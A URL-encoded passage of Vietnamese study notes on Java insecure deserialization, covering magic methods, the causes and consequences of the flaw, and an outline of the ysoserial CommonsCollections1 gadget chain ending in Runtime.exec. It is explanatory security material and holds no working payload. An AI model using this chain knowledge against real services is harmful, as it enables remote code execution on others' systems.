bject()%20ho%E1%BA%B7c%20readResolve()%20%C4%91%E1%BB%83%20x%E1%BB%AD%20l%C3%BD%20d%E1%BB%AF%20li%E1%BB%87u.%0A%3E%20%5Bcolor%3D%23ff0000%5D%20%E2%9C%85%20V%E1%BB%9Bi%20**developer**%3A%20gi%C3%BAp%20t%C3%B9y%20ch%E1%BB%89nh%20h%C3%A0nh%20vi%20object%20khi%20ghi%2F%C4%91%E1%BB%8Dc%20t%E1%BB%AB%20stream.%0A%E2%9D%97%20V%E1%BB%9Bi%20**pentester**%3A%20%C4%91%C3%A2y%20l%C3%A0%20n%C6%A1i%20l%C3%BD%20t%C6%B0%E1%BB%9Fng%20%C4%91%E1%BB%83%20%E1%BA%A9n%20payload%2C%20th%E1%BB%B1c%20thi%20code%20nguy%20hi%E1%BB%83m%20ho%E1%BA%B7c%20k%C3%ADch%20ho%E1%BA%A1t%20gadget%20chain.%0A%0AM%E1%BB%99t%20s%E1%BB%91%20magic%20method%20ti%C3%AAu%20chu%E1%BA%A9n%20trong%20Java%20Serialization%0A%60%60%60markdown%0A%7C%20Ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20%20%20%20%20%20%7C%20Th%E1%BB%9Di%20%C4%91i%E1%BB%83m%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20Vai%20tr%C3%B2%20ch%C3%ADnh%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20----------------%20%7C%20--------------------------------------------------%20%7C%20--------------------------------------------------------------------%20%7C%0A%7C%20readObject()%20%20%20%20%20%7C%20Khi%20object%20%C4%91%C6%B0%E1%BB%A3c%20deserialize%20t%E1%BB%AB%20%60ObjectInputStream%60%20%7C%20T%C3%B9y%20ch%E1%BB%89nh%20c%C3%A1ch%20%C4%91%E1%BB%8Dc%20object%2C%20c%C3%B3%20th%E1%BB%83%20th%E1%BB%B1c%20thi%20logic%20t%C3%B9y%20%C3%BD%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20writeObject()%20%20%20%20%7C%20Khi%20object%20%C4%91%C6%B0%E1%BB%A3c%20serialize%20v%C3%A0o%20ObjectOutputStream%20%20%20%7C%20T%C3%B9y%20ch%E1%BB%89nh%20c%C3%A1ch%20ghi%20d%E1%BB%AF%20li%E1%BB%87u%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20readResolve()%20%20%20%20%7C%20Sau%20khi%20object%20%C4%91%C3%A3%20deserialize%20xong%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20Cho%20ph%C3%A9p%20thay%20th%E1%BA%BF%20object%20v%E1%BB%ABa%20%C4%91%E1%BB%8Dc%20b%E1%BA%B1ng%20object%20kh%C3%A1c%20(singleton%2C%20proxy)%20%7C%0A%7C%20writeReplace()%20%20%20%7C%20Tr%C6%B0%E1%BB%9Bc%20khi%20serialize%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20Cho%20ph%C3%A9p%20thay%20object%20b%E1%BA%B1ng%20m%E1%BB%99t%20object%20kh%C3%A1c%20khi%20ghi%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%0A%60%60%60%0AC%C3%A1c%20magic%20method%20kh%C3%A1c%3A%0A%60%60%60markdown%0A%7C%20Ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20%C4%90i%E1%BB%81u%20ki%E1%BB%87n%20k%C3%ADch%20ho%E1%BA%A1t%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20Nguy%20c%C6%A1%20ti%E1%BB%81m%20%E1%BA%A9n%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20-------------------------%20%7C%20----------------------------------------------------------%20%7C%20-----------------------------------------------------------------------%20%7C%0A%7C%20finalize()%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20JVM%20g%E1%BB%8Di%20khi%20object%20b%E1%BB%8B%20GC%20(garbage%20collected)%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20C%C3%B3%20th%E1%BB%83%20%E1%BA%A9n%20payload%20th%E1%BB%B1c%20thi%20mu%E1%BB%99n%2C%20ho%E1%BA%B7c%20g%C3%A2y%20memory%20leak%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20toString()%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20G%E1%BB%8Di%20khi%20in%20object%2C%20ghi%20log%2C%20debug%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20C%C3%B3%20th%E1%BB%83%20th%E1%BB%B1c%20thi%20code%20khi%20object%20b%E1%BB%8B%20ghi%20log%20ho%E1%BA%B7c%20hi%E1%BB%83n%20th%E1%BB%8B%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20equals()%20%2F%20hashCode()%20%20%20%20%20%7C%20G%E1%BB%8Di%20khi%20so%20s%C3%A1nh%20object%2C%20d%C3%B9ng%20l%C3%A0m%20key%20trong%20Map%2FSet%20%20%20%20%20%20%20%20%20%7C%20C%C3%B3%20th%E1%BB%83%20b%E1%BB%8B%20k%C3%ADch%20ho%E1%BA%A1t%20khi%20deserialize%20object%20%C4%91%C6%B0a%20v%C3%A0o%20t%E1%BA%ADp%20d%E1%BB%AF%20li%E1%BB%87u%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20run()%20%2F%20call()%20%20%20%20%20%20%20%20%20%20%20%20%7C%20G%E1%BB%8Di%20khi%20object%20%C4%91%C6%B0%E1%BB%A3c%20d%C3%B9ng%20trong%20%60Thread%60%2C%20%60ExecutorService%60%20%7C%20Payload%20c%C3%B3%20th%E1%BB%83%20th%E1%BB%B1c%20thi%20khi%20object%20%C4%91%C6%B0%E1%BB%A3c%20submit%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20ClassName()%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20Ch%E1%BB%89%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di%20khi%20%60new%60%2C%20**kh%C3%B4ng%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di%20khi%20deserialize**%20%7C%20Nh%C6%B0ng%20%C4%91%C3%B4i%20khi%20v%E1%BA%ABn%20b%E1%BB%8B%20hi%E1%BB%83u%20nh%E1%BA%A7m%20l%C3%A0%20magic%20method%20n%E1%BA%BFu%20d%C3%B9ng%20gadget%20c%C3%B3%20%60new%60%20%7C%0A%0A%60%60%60%0A%0A%23%23%23%203.%20Insecure%20Deserialization%20l%C3%A0%20g%C3%AC%0AInsecure%20Deserialization%20(Gi%E1%BA%A3i%20tu%E1%BA%A7n%20t%E1%BB%B1%20kh%C3%B4ng%20an%20to%C3%A0n)%20hay%20c%C3%B2n%20g%E1%BB%8Di%20l%C3%A0%20Object%20injection%20l%C3%A0%20m%E1%BB%99t%20l%E1%BB%97%20h%E1%BB%95ng%20b%E1%BA%A3o%20m%E1%BA%ADt%20x%E1%BA%A3y%20ra%20khi%20%E1%BB%A9ng%20d%E1%BB%A5ng%20ch%E1%BA%A5p%20nh%E1%BA%ADn%20d%E1%BB%AF%20li%E1%BB%87u%20%C4%91%C6%B0%E1%BB%A3c%20serialize%20(tu%E1%BA%A7n%20t%E1%BB%B1%20h%C3%B3a)%20t%E1%BB%AB%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng%20m%C3%A0%20kh%C3%B4ng%20x%C3%A1c%20minh%2C%20ki%E1%BB%83m%20so%C3%A1t%20ho%E1%BA%B7c%20l%E1%BB%8Dc%20h%E1%BB%A3p%20l%E1%BB%87%20tr%C6%B0%E1%BB%9Bc%20khi%20deserialize%20(gi%E1%BA%A3i%20tu%E1%BA%A7n%20t%E1%BB%B1%20h%C3%B3a).%0A%0AN%C3%B3i%20c%C3%A1ch%20kh%C3%A1c%2C%20k%E1%BA%BB%20t%E1%BA%A5n%20c%C3%B4ng%20c%C3%B3%20th%E1%BB%83%20g%E1%BB%ADi%20m%E1%BB%99t%20object%20%C4%91%C3%A3%20b%E1%BB%8B%20ch%E1%BB%89nh%20s%E1%BB%ADa%20ho%E1%BA%B7c%20crafted%20(t%C3%B9y%20ch%E1%BB%89nh%20%C4%91%E1%BB%99c%20h%E1%BA%A1i)%20%C4%91%E1%BA%BFn%20server.%20N%E1%BA%BFu%20%E1%BB%A9ng%20d%E1%BB%A5ng%20deserialize%20d%E1%BB%AF%20li%E1%BB%87u%20%C4%91%C3%B3%20m%C3%A0%20kh%C3%B4ng%20ki%E1%BB%83m%20tra%20k%E1%BB%B9%2C%20code%20nguy%20hi%E1%BB%83m%20b%C3%AAn%20trong%20object%20c%C3%B3%20th%E1%BB%83%20%C4%91%C6%B0%E1%BB%A3c%20th%E1%BB%B1c%20thi.%0A%0ATham%20kh%E1%BA%A3o%3A%5Bportswigger%5D(https%3A%2F%2Fportswigger.net%2Fweb-security%2Fdeserialization%23what-is-insecure-deserialization)%2C%20%5Bowasp%5D(https%3A%2F%2Fowasp.org%2Fwww-community%2Fvulnerabilities%2FInsecure_Deserialization)%2C%20%5BA8%3A%20Insecure%20Deserialization%202017%20OWASP%5D(https%3A%2F%2Fwww.wallarm.com%2Fwhat%2Fa8-insecure-deserialization-2017-owasp)%0A%0A%23%23%23%204.%20L%C3%BD%20do%20l%E1%BB%97%20h%E1%BB%95ng%20Insecure%20Deserialization%20ph%C3%A1t%20sinh%3F%0A1.%20Tin%20t%C6%B0%E1%BB%9Fng%20d%E1%BB%AF%20li%E1%BB%87u%20kh%C3%B4ng%20ki%E1%BB%83m%20so%C3%A1t%20%C4%91%C6%B0%E1%BB%A3c%20(Trusting%20Untrusted%20Data)%0AR%E1%BA%A5t%20nhi%E1%BB%81u%20%E1%BB%A9ng%20d%E1%BB%A5ng%20**deserialize**%20d%E1%BB%AF%20li%E1%BB%87u%20do%20client%20g%E1%BB%ADi%20l%C3%AAn%20m%C3%A0%20kh%C3%B4ng%20ki%E1%BB%83m%20tra%20tr%C6%B0%E1%BB%9Bc.%20Theo%20PortSwigger%3A%60%E2%80%9CInsecure%20deserialization%20typically%20arises%20because%20there%20is%20a%20general%20lack%20of%20understanding%20of%20how%20dangerous%20deserializing%20user-controllable%20data%20can%20be.%E2%80%9D%60%0AC%C3%A1c%20developer%20th%C6%B0%E1%BB%9Dng%20tin%20r%E1%BA%B1ng%20vi%E1%BB%87c%20l%E1%BA%ADp%20tr%C3%ACnh%20b%E1%BA%B1ng%20ng%C3%B4n%20ng%E1%BB%AF%20c%C3%B3%20serialize%20nh%E1%BB%8B%20ph%C3%A2n%20th%C3%AC%20kh%C3%B4ng%20d%E1%BB%85%20b%E1%BB%8B%20t%E1%BA%A5n%20c%C3%B4ng%2C%20nh%C6%B0ng%20th%E1%BB%B1c%20t%E1%BA%BF%20kh%C3%B4ng%20nh%C6%B0%20v%E1%BA%ADy.%0A2.%20Qu%C3%A1%20tr%C3%ACnh%20**deserialize**%20g%E1%BB%8Di%20t%E1%BB%B1%20%C4%91%E1%BB%99ng%20c%C3%A1c%20method%20nguy%20hi%E1%BB%83m%0ANgay%20khi%20JVM%20b%E1%BA%AFt%20%C4%91%E1%BA%A7u%20deserialize%2C%20c%C3%A1c%20magic%20method%20nh%C6%B0%20%60readObject()%60%2C%20%60readResolve()%60%2C%20%60writeReplace()%60%20c%C3%B3%20th%E1%BB%83%20%C4%91%C6%B0%E1%BB%A3c%20g%E1%BB%8Di%20%E2%80%94%20tr%C6%B0%E1%BB%9Bc%20khi%20b%E1%BA%A5t%20c%E1%BB%A9%20validation%20n%C3%A0o%20%C4%91%C6%B0%E1%BB%A3c%20th%E1%BB%B1c%20hi%E1%BB%87n.%0AC%C3%BA%20ph%C3%A1p%20%60readResolve()%60%20ho%E1%BA%B7c%20%60readObject()%60%20ch%E1%BB%A9a%20logic%20t%C3%B9y%20ch%E1%BB%89nh%20c%C3%B3%20th%E1%BB%83%20**ch%E1%BB%A9a%20l%E1%BB%87nh%20nguy%20hi%E1%BB%83m**%2C%20v%C3%A0%20n%C3%B3%20s%E1%BA%BD%20ch%E1%BA%A1y%20**ngay%20t%E1%BA%A1i%20th%E1%BB%9Di%20%C4%91i%E1%BB%83m%20%C4%91%C3%B3**.%0A3.%20Th%C6%B0%20vi%E1%BB%87n%20b%C3%AAn%20th%E1%BB%A9%203%20ch%E1%BB%A9a%20gadget%20s%E1%BA%B5n%20s%C3%A0ng%20l%E1%BB%A3i%20d%E1%BB%A5ng%20(Gadget%20availability)%0AC%C3%A1c%20framework%20Java%20nh%C6%B0%20**Apache%20Commons%2C%20Spring%2C%20Groovy**...%20ch%E1%BB%A9a%20s%E1%BA%B5n%20c%C3%A1c%20class%20c%C3%B3%20c%C3%A1c%20method%20c%C3%B3%20th%E1%BB%83%20%C4%91%C6%B0%E1%BB%A3c%20d%C3%B9ng%20trong%20gadget%20chain%20%C4%91%E1%BB%83%20k%C3%ADch%20ho%E1%BA%A1t%20payload%20%E2%80%93%20v%C3%AD%20d%E1%BB%A5%20%60InvokerTransformer.invoke()%60.%0ADo%20m%C3%B4i%20tr%C6%B0%E1%BB%9Dng%20ph%E1%BB%A5%20thu%E1%BB%99c%20%C4%91a%20d%E1%BA%A1ng%2C%20attacker%20c%C3%B3%20th%E1%BB%83%20t%C3%ACm%20class%20c%C3%B3%20%60readObject()%60%20th%E1%BB%B1c%20thi%20v%C3%A0%20chain%20th%C3%A0nh%20RCE.%0A4.%20Kh%C3%B3%20ki%E1%BB%83m%20so%C3%A1t%20whitelist%2Fvalidation%20sau%20deserialize%0AD%C3%B9%20c%C3%B3%20d%C3%B9ng%20whitelist%2C%20vi%E1%BB%87c%20ki%E1%BB%83m%20so%C3%A1t%20t%E1%BA%A5t%20c%E1%BA%A3%20c%C3%A1c%20class%20ho%E1%BA%B7c%20logic%20ph%E1%BB%A9c%20t%E1%BA%A1p%20trong%20%60readObject()%60%20r%E1%BA%A5t%20d%E1%BB%85%20b%E1%BB%8B%20b%E1%BB%8F%20s%C3%B3t.%20Theo%20PortSwigger%3A%60%E2%80%9CIdeally%2C%20user%20input%20should%20never%20be%20deserialized%20at%20all%E2%80%A6%20it%20is%20virtually%20impossible%20to%20implement%20validation%20or%20sanitization%20to%20account%20for%20every%20eventuality.%E2%80%9D%60%0A5.%20L%E1%BB%97i%20t%E1%BB%AB%20vi%E1%BB%87c%20ph%E1%BB%A5%20thu%E1%BB%99c%20v%C3%A0o%20serialization%20nh%E1%BB%8B%20ph%C3%A2n%0AC%C3%A1c%20ng%C3%B4n%20ng%E1%BB%AF%20nh%C6%B0%20Java%2C%20PHP%20(serialize)%2C%20Python%20(pickle)%20d%C3%B9ng%20nh%E1%BB%8B%20ph%C3%A2n%2C%20th%C6%B0%E1%BB%9Dng%20b%E1%BB%8B%20tin%20t%C6%B0%E1%BB%9Fng%20l%C3%A0%20%E2%80%9Cb%C3%AD%20m%E1%BA%ADt%E2%80%9D%20kh%C3%B3%20%C4%91%E1%BB%8Dc%20ho%E1%BA%B7c%20thay%20%C4%91%E1%BB%95i.%20Nh%C6%B0ng%20attacker%20c%C3%B3%20th%E1%BB%83%20d%C3%B9ng%20c%C3%B4ng%20c%E1%BB%A5%20nh%C6%B0%20**ysoserial%2C%20Burp**%20%C4%91%E1%BB%83%20craft%20payload%20nh%E1%BB%8B%20ph%C3%A2n%20r%E1%BA%A5t%20d%E1%BB%85%20d%C3%A0ng%20.%0A%0ATham%20kh%E1%BA%A3o%3A%5BSaniye%20Nur%5D(https%3A%2F%2Fsnynr.medium.com%2Funderstanding-insecure-deserialization-risks-and-mitigations-e726dcf624e7)%2C%20%5BAbhay%20Bhargav%5D(https%3A%2F%2Fwww.appsecengineer.com%2Fblog%2Fwhat-is-insecure-deserialization)%0A%0A%23%23%23%205.%20H%E1%BA%ADu%20qu%E1%BA%A3%20c%E1%BB%A7a%20Insecure%20Deserialization%0A1.%20Remote%20Code%20Execution%20(RCE)%0AKhi%20%E1%BB%A9ng%20d%E1%BB%A5ng%20deserialize%20d%E1%BB%AF%20li%E1%BB%87u%20t%E1%BB%AB%20ngu%E1%BB%93n%20kh%C3%B4ng%20ki%E1%BB%83m%20so%C3%A1t%2C%20attacker%20c%C3%B3%20th%E1%BB%83%20g%E1%BB%ADi%20payload%20ch%E1%BB%A9a%20**gadget%20chain**%2C%20qua%20c%C3%A1c%20magic%20method%20nh%C6%B0%20%60readObject()%60%20%C4%91%E1%BB%83%20th%E1%BB%B1c%20thi%20m%C3%A3%20t%C3%B9y%20%C3%BD.%20Theo%20OWASP%2C%20%C4%91%C3%A2y%20l%C3%A0%20m%E1%BB%99t%20trong%20c%C3%A1c%20h%E1%BA%ADu%20qu%E1%BA%A3%20nghi%C3%AAm%20tr%E1%BB%8Dng%20nh%E1%BA%A5t%20c%E1%BB%A7a%20l%E1%BB%97i%20n%C3%A0y.%0A2.%20%20Denial-of-Service%20(DoS)%0A**Deserialization**%20ph%E1%BB%A9c%20t%E1%BA%A1p%20c%C3%B3%20th%E1%BB%83%20t%E1%BB%91n%20t%C3%A0i%20nguy%C3%AAn%20%C4%91%C3%A1ng%20k%E1%BB%83.%20Attacker%20c%C3%B3%20th%E1%BB%83%20g%E1%BB%ADi%20m%E1%BB%99t%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20ph%E1%BB%A9c%20t%E1%BA%A1p%20ho%E1%BA%B7c%20m%E1%BA%A3ng%20l%E1%BB%93ng%20nhau%20kh%C3%B4ng%20h%E1%BB%93i%20k%E1%BA%BFt%20%C4%91%E1%BB%83%20khi%E1%BA%BFn%20server%20b%E1%BB%8B%20t%E1%BA%AFc%20ngh%E1%BA%BDn%2C%20crash%20ho%E1%BA%B7c%20ng%E1%BA%AFt%20d%E1%BB%8Bch%20v%E1%BB%A5.%0A3.%20Privilege%20Escalation%20(t%C4%83ng%20quy%E1%BB%81n)%0AD%E1%BB%AF%20li%E1%BB%87u%20serialized%20ch%E1%BB%A9a%20c%C3%A1c%20tr%C6%B0%E1%BB%9Dng%20nh%E1%BA%A1y%20c%E1%BA%A3m%20nh%C6%B0%20role%2C%20token...%20n%E1%BA%BFu%20b%E1%BB%8B%20ch%E1%BB%89nh%20s%E1%BB%ADa%2C%20attacker%20c%C3%B3%20th%E1%BB%83%20t%E1%BB%B1%20n%C3%A2ng%20quy%E1%BB%81n%2C%20v%C3%AD%20d%E1%BB%A5%20chuy%E1%BB%83n%20t%E1%BB%AB%20%60isAdmin%3Dfalse%60%20th%C3%A0nh%20true%20%C4%91%E1%BB%83%20truy%20c%E1%BA%ADp%20admin%20panel%20.%0A4.%20Logic%20Manipulation%20%26%20Access%20Control%20Bypass%0AObject%20injection%20c%C3%B3%20th%E1%BB%83%20thay%20%C4%91%E1%BB%95i%20h%C3%A0nh%20vi%20b%C3%AAn%20trong%20%E1%BB%A9ng%20d%E1%BB%A5ng.%20V%C3%AD%20d%E1%BB%A5%2C%20thu%E1%BB%99c%20t%C3%ADnh%20avatar_link%20n%E1%BA%B1m%20trong%20session%20cookie%20c%C3%B3%20th%E1%BB%83%20%C4%91%C6%B0%E1%BB%A3c%20ch%E1%BB%89nh%20s%E1%BB%ADa%20%C4%91%E1%BB%83%20x%C3%B3a%20file%20quan%20tr%E1%BB%8Dng%0A5.%20Object%20Injection%20%26%20T%C3%A0i%20nguy%C3%AAn%20tr%C3%A1i%20ph%C3%A9p%0AAttacker%20c%C3%B3%20th%E1%BB%83%20inject%20c%C3%A1c%20object%20kh%C3%B4ng%20mong%20mu%E1%BB%91n%20v%C3%A0o%20%E1%BB%A9ng%20d%E1%BB%A5ng%2C%20c%C3%B3%20th%E1%BB%83%20g%C3%A2y%20r%C3%B2%20r%E1%BB%89%20d%E1%BB%AF%20li%E1%BB%87u%2C%20k%C3%ADch%20ho%E1%BA%A1t%20ch%E1%BB%A9c%20n%C4%83ng%20ch%C6%B0a%20public%2C%20ho%E1%BA%B7c%20ph%C3%A1%20v%E1%BB%A1%20logic%20lu%E1%BB%93ng%20x%E1%BB%AD%20l%C3%BD%20c%E1%BB%A7a%20%E1%BB%A9ng%20d%E1%BB%A5ng%0A%60%60%60markdown%0A%7C%20H%E1%BA%ADu%20qu%E1%BA%A3%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20M%C3%B4%20t%E1%BA%A3%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20---------------------------------%20%7C%20--------------------------------------------------------%20%7C%0A%7C%20RCE%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20Cho%20ph%C3%A9p%20attacker%20th%E1%BB%B1c%20thi%20m%C3%A3%20t%C3%B9y%20%C3%BD%20tr%C3%AAn%20m%C3%A1y%20ch%E1%BB%A7%20%20%20%20%20%20%20%20%20%7C%0A%7C%20DoS%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20G%C3%A2y%20treo%20server%20ho%E1%BA%B7c%20ph%C3%A1%20h%E1%BB%A7y%20d%E1%BB%8Bch%20v%E1%BB%A5%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%0A%7C%20Privilege%20Escalation%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20T%E1%BB%AB%20user%20th%C6%B0%E1%BB%9Dng%20l%C3%AAn%20admin%2C%20ho%E1%BA%B7c%20v%C6%B0%E1%BB%A3t%20r%C3%A0o%20h%E1%BA%A1n%20m%E1%BB%A9c%20truy%20c%E1%BA%ADp%20%7C%0A%7C%20Bypass%20Access%20Control%20%2F%20Logic%20%20%20%20%20%7C%20Thay%20%C4%91%E1%BB%95i%20logic%20%2F%20bypass%20ch%E1%BB%A9c%20n%C4%83ng%20b%E1%BA%A3o%20m%E1%BA%ADt%20%E1%BB%A9ng%20d%E1%BB%A5ng%20%20%20%20%20%20%20%7C%0A%7C%20Object%20Injection%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7C%20G%E1%BB%ADi%20object%20tr%C3%A1i%20ph%C3%A9p%20%C4%91%E1%BB%83%20khai%20th%C3%A1c%20t%C3%ADnh%20n%C4%83ng%20%2F%20g%C3%A2y%20r%C3%B2%20r%E1%BB%89%20%20%7C%0A%0A%60%60%60%0A%23%23%23%206.%20Gadget%20chain%20l%C3%A0%20g%C3%AC%3F%0A**Gadget%20Chain**%20(hay%20chu%E1%BB%97i%20gadget)%20l%C3%A0%20m%E1%BB%99t%20**d%C3%A3y%20g%E1%BB%8Di%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20t%E1%BB%B1%20%C4%91%E1%BB%99ng**%20%C4%91%C6%B0%E1%BB%A3c%20k%C3%ADch%20ho%E1%BA%A1t%20ch%C3%ADnh%20trong%20qu%C3%A1%20tr%C3%ACnh%20**deserialization**.%20Khi%20attacker%20g%E1%BB%ADi%20m%E1%BB%99t%20%C4%91%E1%BB%91i%20t%C6%B0%E1%BB%A3ng%20%C4%91%C6%B0%E1%BB%A3c%20crafted%20%C4%91%C3%BAng%20c%C3%A1ch%20%C4%91%E1%BA%BFn%20%E1%BB%A9ng%20d%E1%BB%A5ng%20c%C3%B3%20l%E1%BB%97%20h%E1%BB%95ng%20*Insecure%20Deserialization*%2C%20JVM%20s%E1%BA%BD%20t%E1%BB%B1%20%C4%91%E1%BB%99ng%20g%E1%BB%8Di%20m%E1%BB%99t%20lo%E1%BA%A1t%20ph%C6%B0%C6%A1ng%20th%E1%BB%A9c%20tr%C3%AAn%20c%C3%A1c%20class%20c%C3%B3%20s%E1%BA%B5n%20trong%20classpath%20c%E1%BB%A7a%20%E1%BB%A9ng%20d%E1%BB%A5ng%20%E2%80%93%20t%E1%BB%AB%20**source**%20(th%C6%B0%E1%BB%9Dng%20l%C3%A0%20%60%60%60readObject())%60%60%60%20%C4%91%E1%BA%BFn%20sink%20(v%C3%AD%20d%E1%BB%A5%20%60%60%60Runtime.exec)%60%60%60%2C%20t%E1%BA%A1o%20n%C3%AAn%20chu%E1%BB%97i%20t%C6%B0%C6%A1ng%20t%C3%A1c%20d%E1%BA%ABn%20%C4%91%E1%BA%BFn%20**Remote%20Code%20Execution%20(RCE)**%20ho%E1%BA%B7c%20c%C3%A1c%20h%E1%BA%ADu%20qu%E1%BA%A3%20kh%C3%A1c.%0A%0A%3E%20%5Bcolor%3D%23ff0000%5D%C4%90%C3%A2y%20kh%C3%B4ng%20ph%E1%BA%A3i%20l%C3%A0%20m%E1%BB%99t%20l%E1%BB%9Bp%20%C4%91%E1%BB%99c%20l%E1%BA%ADp%2C%20m%C3%A0%20l%C3%A0%20s%E1%BB%B1%20**t%E1%BA%ADn%20d%E1%BB%A5ng%20l%E1%BA%A1i%20c%C3%A1c%20%C4%91o%E1%BA%A1n%20code%20s%E1%BA%B5n%20c%C3%B3**%20%E2%80%93%20g%E1%BB%8Di%20l%C3%A0%20**gadgets**%20%E2%80%93%20k%E1%BA%BFt%20n%E1%BB%91i%20th%C3%A0nh%20chu%E1%BB%97i%20(chain)%20%C4%91%E1%BB%83%20%C4%91%E1%BA%A1t%20m%E1%BB%A5c%20%C4%91%C3%ADch%20t%E1%BA%A5n%20c%C3%B4ng.%0A%0A%0A%E1%BB%9E%20%C4%91%C3%A2y%20m%C3%ACnh%20s%E1%BA%BD%20v%C3%AD%20d%E1%BB%A5%20m%E1%BB%99t%20chu%E1%BB%97i%20gadget%20%C4%91i%E1%BB%83n%20h%C3%ACnh%20trong%20ysoserial%20l%C3%A0%20**CommonsCollections1**%3A%0A%3E%20%5Bcolor%3D%231e90ff%5D%0A%3E%20-%20B%E1%BA%AFt%20%C4%91%E1%BA%A7u%20t%E1%BB%AB%20%60%60%60readObject()%60%60%60%20l%E1%BB%9Bp%20Hashtable%0A%3E-%20Chuy%E1%BB%83n%20t%E1%BB%9Bi%20%60%60%60AbstractMap.equals()%60%60%60%0A%3E-%20R%E1%BB%93i%20qua%20LazyMap.get()%0A%3E-%20Cu%E1%BB%91i%20c%C3%B9ng%20g%E1%BB%8Di%20%60%60%60InvokerTransformer.transform()%60%60%60%20%E2%86%92%20th%E1%BB%B1c%20thi%20%60%60%60Runtime.exec()%60%60%60%0A%0AV%C3%AC%20%C4%91%C3%A2y%20l%C3%A0%20l%E1%BB%97i%20ch%C3%BAng%20ta%20s%E1%BB%AD%20d%E1%BB%A5ng%20c%C3%A1c%20%C4%91o%E1%BA%A1n%20code%20c%C3%B3%20s%E1%BA%B5n%20trong%20%E1%BB%A9ng%20d%E1%BB%A5ng%2Flibrary%20n%C3%AAn%20l%C3%BAc%20n%C3%A0y%20s%E1%BA%BD%20g%C3%A2y%20ra%20nhi%E1%BB%81u%20nguy%20hi%E1%BB%83m%20ti%E1%BB%81m%20t%C3%A0ng%20cho%20h%E1%BB%87%20th%E1%BB%91ng%20%C4%91%C3%B3.%0A%3E%20%5Bcolor%3D%23ff0000%5D**Nguy%20c%C6%A1%20ti%E1%BB%81m%20t%C3%A0ng%20c%E1%BB%A7a%20l%E1%BB%97i%20n%C3%A0y%20n%E1%BA%B1m%20%E1%BB%9F%20ch%E1%BB%97%3A**%0A%3E%20-%20Kh%C3%B4ng%20c%E1%BA%A7n%20class%20custom%20nguy%20hi%E1%BB%83m%3A%20Ch%E1%BB%89%20d%E1%BB%B1a%20tr%C3%AAn%20class%20c%C3%B3%20s%E1%BA%B5n%20trong%20dependency.%0A%3E%20-%20Ph%C3%A1t%20hi%E1%BB%87n%20nhanh%20ch%C3%B3ng%3A%20H%C3%A0ng%20lo%E1%BA%A1t%20gadget%20chain%20%C4%91%C3%A3%20%C4%91%C6%B0%E1%BB%A3c%20c%C3%B4ng%20khai%20(CommonsCollections%2C%20Spring%2C%20Groovy...)%20v%C3%A0%20t%C3%ADch%20h%E1%BB%A3p%20s%E1%BA%B5n%20trong%20ysoserial.%0A%3E%20-%20Kh%C3%B3%20ng%C4%83n%20ch%E1%BA%B7n%3A%20Validator%20th%C3%B4ng%20th%C6%B0%E1%BB%9Dng%20kh%C3%B4ng%20th%E1%BB%83%20x%C3%A9t%20h%E1%BA%BFt%20t%E1%BA%A5t%20c%E1%BA%A3%20c%C3%A1c%20chain%20c%C3%B3%20th%E1%BB%83%20%C4%91%C6%B0%E1%BB%A3c%20x%C3%A2y%20d%E1%BB%B1ng.%0A%0ATham%20kh%E1%BA%A3o%3A%5BJava-Deserialization-Cheat-Sheet%5D(https%3A%2F%2Fgithub.com%2FGrrrDog%2FJava-